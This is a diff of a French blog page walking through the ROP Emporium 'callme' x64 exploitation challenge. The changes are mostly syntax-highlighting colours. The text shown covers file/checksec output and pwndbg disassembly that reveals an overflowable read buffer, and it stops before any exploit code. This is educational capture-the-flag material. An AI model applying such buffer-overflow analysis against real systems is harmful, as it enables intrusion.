@@ -28,6 +28,10 @@
 
 
 
+    
+        <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    
+
 
     <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -173,19 +177,19 @@
 <p>Si vous ne comprenez pas quelque chose, je vous invite à <a href="/series/ropemporium-x64-series/">regarder la série dans l&rsquo;ordre</a>.</p>
 <h2 id="file-information">File information</h2>
 <p>Avant de commencer à regarder dans l&rsquo;executable, il faut savoir à quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les éventuelles sécuritées avec lesquelles il a été compilé</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">callme</span> 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#ff79c6">file</span> <span style="color:#ff79c6">callme</span> 
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">callme</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">e8e49880bdcaeb9012c6de5f8002c72d8827ea4c</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">callme</span><span style="color:#ff79c6">:</span> <span style="color:#ff79c6">ELF</span> <span style="color:#ff79c6">64-bit</span> <span style="color:#ff79c6">LSB</span> <span style="color:#ff79c6">executable</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">x86-64</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">version</span> <span style="color:#ff79c6">1</span> <span style="color:#ff79c6">(</span><span style="color:#ff79c6">SYSV</span><span style="color:#ff79c6">),</span> <span style="color:#ff79c6">dynamically</span> <span style="color:#ff79c6">linked</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">interpreter</span> <span style="color:#ff79c6">/</span><span style="color:#ff79c6">lib64</span><span style="color:#ff79c6">/</span><span style="color:#ff79c6">ld-linux-x86-64</span>.<span style="color:#50fa7b">so</span>.<span style="color:#50fa7b">2</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">GNU</span><span style="color:#ff79c6">/</span><span style="color:#ff79c6">Linux</span> <span style="color:#ff79c6">3</span>.<span style="color:#50fa7b">2</span>.<span style="color:#50fa7b">0</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">BuildID</span><span style="color:#ff79c6">[</span><span style="color:#ff79c6">sha1</span><span style="color:#ff79c6">]=</span><span style="color:#ff79c6">e8e49880bdcaeb9012c6de5f8002c72d8827ea4c</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">stripped</span>
 </span></span></code></pre></div><p>On va donc s&rsquo;attaquer à un executable en 64bit, linké dynamiquement et qui n&rsquo;est pas strippé
 Maintenant le <code>checksec</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">callme</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#ff79c6">checksec</span> <span style="color:#ff79c6">callme</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/callme_x64/callme&#39;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[*]</span> <span style="color:#f1fa8c">&#39;/home/conflict/ropemporium/callme_x64/callme&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">Arch</span><span style="color:#ff79c6">:</span>     <span style="color:#ff79c6">amd64-64-little</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">RELRO</span><span style="color:#ff79c6">:</span>    <span style="color:#ff79c6">Partial</span> <span style="color:#ff79c6">RELRO</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">Stack</span><span style="color:#ff79c6">:</span>    <span style="color:#ff79c6">No</span> <span style="color:#ff79c6">canary</span> <span style="color:#ff79c6">found</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">NX</span><span style="color:#ff79c6">:</span>       <span style="color:#ff79c6">NX</span> <span style="color:#ff79c6">enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">PIE</span><span style="color:#ff79c6">:</span>      <span style="color:#ff79c6">No</span> <span style="color:#ff79c6">PIE</span> <span style="color:#ff79c6">(</span><span style="color:#ff79c6">0x400000</span><span style="color:#ff79c6">)</span>
 </span></span></code></pre></div><p>Comme pour le précédent, <strong>NX</strong> est activé donc pas de shellcode, mais ce n&rsquo;est pas un problème puisque la description de l&rsquo;exercice nous indique exactement quoi faire</p>
 <h2 id="exploitation">Exploitation</h2>
 <p>Voici la description:</p>
@@ -197,84 +201,84 @@ For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef
 <p>On peut quand même le lancer et voir ce qu&rsquo;il fait:</p>
 <p><img src="https://user-images.githubusercontent.com/77807503/212548895-0fd03e37-d707-47da-ae38-d1789011bca0.png" alt="2023-01-15-150610_1072x508_scrot"></p>
 <p>Comme pour le précédent, on voit qu&rsquo;on peut overflow le buffer en envoyant un nombre conséquent de bytes. Désassemblons le <code>main</code> pour voir plus clairement ce qu&rsquo;il se passe:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main
-</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400847</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400848</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040084b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20081e</span>]        <span style="color:#75715e"># 0x601070 &lt;stdout@@GLIBC_2.2.5&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400852</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:  mov    ecx,<span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400857</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x2</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040085c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>:  mov    esi,<span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400861</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400864</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">29</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400730</span> <span style="color:#f92672">&lt;</span>setvbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400869</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">34</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4009c8</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040086e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400873</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4009df</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400878</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040087d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400882</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400898</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400887</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4009e7</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040088c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400891</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400896</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">79</span><span style="color:#f92672">&gt;</span>:  pop    rbp
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400897</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:  ret    
-</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#ff79c6">&gt;</span> disass main
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#ff79c6">for</span> function main:
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400847</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">&gt;</span>: push   rbp
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400848</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">&gt;</span>: mov    rbp,rsp
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000000000040084b</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">4</span><span style="color:#ff79c6">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x20081e</span>]        <span style="color:#6272a4"># 0x601070 &lt;stdout@@GLIBC_2.2.5&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400852</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">&gt;</span>:  mov    ecx,<span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400857</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">16</span><span style="color:#ff79c6">&gt;</span>:  mov    edx,<span style="color:#bd93f9">0x2</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000000000040085c</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">21</span><span style="color:#ff79c6">&gt;</span>:  mov    esi,<span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400861</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">26</span><span style="color:#ff79c6">&gt;</span>:  mov    rdi,rax
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400864</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">29</span><span style="color:#ff79c6">&gt;</span>:  call   <span style="color:#bd93f9">0x400730</span> <span style="color:#ff79c6">&lt;</span>setvbuf@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400869</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">34</span><span style="color:#ff79c6">&gt;</span>:  mov    edi,<span style="color:#bd93f9">0x4009c8</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000000000040086e</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">39</span><span style="color:#ff79c6">&gt;</span>:  call   <span style="color:#bd93f9">0x4006d0</span> <span style="color:#ff79c6">&lt;</span>puts@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400873</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">44</span><span style="color:#ff79c6">&gt;</span>:  mov    edi,<span style="color:#bd93f9">0x4009df</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400878</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">49</span><span style="color:#ff79c6">&gt;</span>:  call   <span style="color:#bd93f9">0x4006d0</span> <span style="color:#ff79c6">&lt;</span>puts@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000000000040087d</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">54</span><span style="color:#ff79c6">&gt;</span>:  mov    eax,<span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400882</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">59</span><span style="color:#ff79c6">&gt;</span>:  call   <span style="color:#bd93f9">0x400898</span> <span style="color:#ff79c6">&lt;</span>pwnme<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400887</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">64</span><span style="color:#ff79c6">&gt;</span>:  mov    edi,<span style="color:#bd93f9">0x4009e7</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000000000040088c</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">69</span><span style="color:#ff79c6">&gt;</span>:  call   <span style="color:#bd93f9">0x4006d0</span> <span style="color:#ff79c6">&lt;</span>puts@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400891</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">74</span><span style="color:#ff79c6">&gt;</span>:  mov    eax,<span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400896</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">79</span><span style="color:#ff79c6">&gt;</span>:  pop    rbp
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400897</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">80</span><span style="color:#ff79c6">&gt;</span>:  ret    
+</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#ff79c6">.</span>
 </span></span></code></pre></div><p>Comme d&rsquo;habitude, il fait appel à la fonction <code>pwnme</code>, désassemblons-la elle aussi:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
-</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400898</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400899</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040089c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: sub    rsp,<span style="color:#ae81ff">0x20</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008a0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>: lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008a4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x20</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008a9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">17</span><span style="color:#f92672">&gt;</span>:  mov    esi,<span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ae</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">22</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400700</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008b6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4009f0</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008bb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">35</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008c0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x400a13</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008c5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ca</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">50</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006e0</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008cf</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">55</span><span style="color:#f92672">&gt;</span>:  lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008d3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x200</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008d8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:  mov    rsi,rax
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008db</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008e0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400710</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008e5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">77</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x400a16</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ea</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ef</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:  nop
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008f0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">88</span><span style="color:#f92672">&gt;</span>:  leave  
-</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008f1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;</span>:  ret    
-</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#ff79c6">&gt;</span> disass pwnme
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#ff79c6">for</span> function pwnme:
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400898</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">&gt;</span>: push   rbp
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x0000000000400899</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">&gt;</span>: mov    rbp,rsp
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x000000000040089c</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">4</span><span style="color:#ff79c6">&gt;</span>: sub    rsp,<span style="color:#bd93f9">0x20</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008a0</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">8</span><span style="color:#ff79c6">&gt;</span>: lea    rax,[rbp<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x20</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008a4</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">12</span><span style="color:#ff79c6">&gt;</span>:  mov    edx,<span style="color:#bd93f9">0x20</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008a9</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">17</span><span style="color:#ff79c6">&gt;</span>:  mov    esi,<span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008ae</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">22</span><span style="color:#ff79c6">&gt;</span>:  mov    rdi,rax
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008b1</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">25</span><span style="color:#ff79c6">&gt;</span>:  call   <span style="color:#bd93f9">0x400700</span> <span style="color:#ff79c6">&lt;</span>memset@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008b6</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">30</span><span style="color:#ff79c6">&gt;</span>:  mov    edi,<span style="color:#bd93f9">0x4009f0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008bb</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">35</span><span style="color:#ff79c6">&gt;</span>:  call   <span style="color:#bd93f9">0x4006d0</span> <span style="color:#ff79c6">&lt;</span>puts@plt<span style="color:#ff79c6">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008c0</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">40</span><span style="color:#ff79c6">&gt;</span>:  mov    edi,<span style="color:#bd93f9">0x400a13</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008c5</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">45</span><span style="color:#ff79c6">&gt;</span>:  mov    eax,<span style="color:#bd93f9">0x0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#bd93f9">0x00000000004008ca</span> <span style="color:#ff79c6">&lt;+</span><span style="color:#bd93f9">50</span><span style="color:#ff79c6">&gt;</span>:  call   <span style="color:#bd93f9">0x4006e0</span> <span style="color:#ff79c6">&lt;</span>printf@plt<span style="color:#ff79c6">&gt;</span>
